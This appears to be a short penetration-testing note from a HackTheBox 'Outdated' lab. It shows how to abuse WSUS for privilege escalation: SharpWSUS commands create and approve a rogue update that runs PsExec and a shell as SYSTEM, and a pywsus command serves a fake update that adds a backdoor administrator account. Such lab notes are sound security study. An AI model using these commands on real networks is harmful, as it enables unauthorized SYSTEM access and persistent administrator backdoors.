https://github.com/nettitude/SharpWSUS

```powershell
.\sharpwsus.exe create /payload:"C:\programdata\psexec.exe" /args:"-accepteula -s -d C:\\programdata\\shell.exe" /title:"privme3"
```

Approve afterwards
```powershell
.\sharpwsus.exe approve /updateid:101126cc-fce2-4691-bf33-40a701c95a49 /computername:DC.outdated.htb /groupname:"Great UpdateC21"
```

[Resource](https://retest.dk/wsus-local-privesc-delivery-optimization/?lang=en)
[pywsus](https://github.com/GoSecure/pywsus)

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate
```

Then, edit /etc/hosts on the attacker’s machine, adding an entry that will point to the access point’s IP for that domain

```bash
10.10.11.175 wsus.outdated.htb
```

Once [pywsus](https://github.com/GoSecure/pywsus) is downloaded, we need to download and extract [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec). The rogue WSUS server can then be started with the command:

```bash
python pywsus.py --host 10.10.11.175 --port 8530 --executable /home/adot/opt/PsExec64.exe --command '/accepteula /s cmd.exe /c "net user adot Pwned123~ /add && net localgroup administrators adot /add"'
```